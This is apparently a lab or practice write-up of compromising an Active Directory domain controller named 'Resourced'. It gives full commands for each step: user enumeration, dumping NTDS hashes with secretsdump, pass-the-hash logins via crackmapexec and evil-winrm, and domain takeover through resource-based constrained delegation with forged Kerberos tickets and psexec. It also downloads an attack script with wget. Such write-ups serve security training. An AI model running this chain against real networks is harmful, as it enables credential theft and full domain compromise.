---
description: Owned DC using a Resource-Based Constrained Delegation technique
---

# Resourced

## Summary

* A list of usernames from the <mark style="color:red;">enum4linux</mark> tool was retrieved along with one user's password, which was written in the description.&#x20;
* Enumerated SMB using the credentials and got interesting files like <mark style="color:red;">ntds.dit</mark>
* Used secretdump.py to extract hashes from <mark style="color:red;">ntds.dit</mark> file
  * Validated the hashes against <mark style="color:red;">crackmapexec</mark> to get a valid hash for another user.
* `L.Livingstone` turned out to be a sysadmin giving us access to the machine via Winrm
* Now used BloodHound-python to get Privilege escalation and lateral movement Vector
  * L. Livingstone had genericAll permission on the DC machine.
* As suggested by BloodHound, we can own the DC by using a <mark style="background-color:red;">Resource-Based Constrained Delegation technique</mark>

## Let's Unpack

### Enumeration

Retrieved list of users and a user's password in the description

<pre class="language-bash"><code class="lang-bash">enum4linux -a 192.168.172.175
>
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                  
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!

# Got credential of one user
<strong>V.Ventz
</strong><strong>HotelCalifornia194!
</strong> 
 # validated credentials using cme
 crackmapexec smb 192.168.172.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --continue-on-success
</code></pre>



Using smbClient, retrieved preety interesting files

```bash
smbclient  '//192.168.172.175/Password Audit' -U V.Ventz

- ntds.dit
- ntds.jfm
- SECURITY
- SYSTEM
```

### Initial Foodhold

For retrieving Credentials from ntds.dit file, I referred to the following article

[https://www.hackingarticles.in/credential-dumping-ntds-dit/](https://www.hackingarticles.in/credential-dumping-ntds-dit/)

```bash
 impacket-secretsdump -ntds ntds.dit -security SECURITY -system SYSTEM
 
 # Got a Bunch of hash but all users, but most of them were expired
 # used crackmapexec to check the validity of the has
 crackmapexec winrm 192.168.120.181 -u users -H hashes
 # Got one valid hash and had winrm access as well
 V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::

```

Using `evil-winrm` to get into the machine

```sh
evil-winrm -i 192.168.172.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808

# Got the local.txt
```

### Priv Escalation and Lateral Movement

Using BloodHound to find more vectors for lateral movement

```bash
bloodhound-python -d resourced.local -u V.Ventz -p 'HotelCalifornia194!' -ns 192.168.191.175 -c All 
```

#### Findings

* The user `L.LIVINGSTONE@RESOURCED.LOCAL` has <mark style="color:red;">GenericAll</mark> privileges to the computer `RESOURCEDC.RESOURCED.LOCAL.`

<figure><img src="../.gitbook/assets/Screenshot 2024-07-07 at 1.59.22 AM (1).png" alt=""><figcaption></figcaption></figure>

The possible Attack Vector, as suggested by Bloodhound, was a **Constrained Delegation attack.**



Let's create a new machine account on the domain. We can do with by using `impacket-addcomputer`.

```bash
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 \n
-hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' \n
-computer-pass 'AttackerPC1!'

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.

```

Now, we need to set <mark style="background-color:red;">msDS-AllowedToActOnBehalfOfOtherIdentity</mark> on our new machine account. For this, we will use impacket-rbcd.py

```bash
impacket-rbcd -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' \n
 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone 

# For some reason, impacket gave odd error, so I had to download the script instead
wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  

sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' \n
 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

```

Now let's grap Silver ticket using  `impacket-getST`&#x20;

```bash
# First, fix the skewed clock
rdate -n 192.168.120.181

# Get the silver ticket
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' \n
-impersonate Administrator -dc-ip 192.168.120.181

# Silver ticket is saved in Administrator.ccache. Let's export it into the env variable
export KRB5CCNAME=./Administrator.ccache
```

Now that we have our silver ticket, we can move laterally to the ResourceDC machine impersonating as Administrator using Psexec.

```bash
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 

# Boom@ Got the Admin shell and proof.txt as well :) 
```





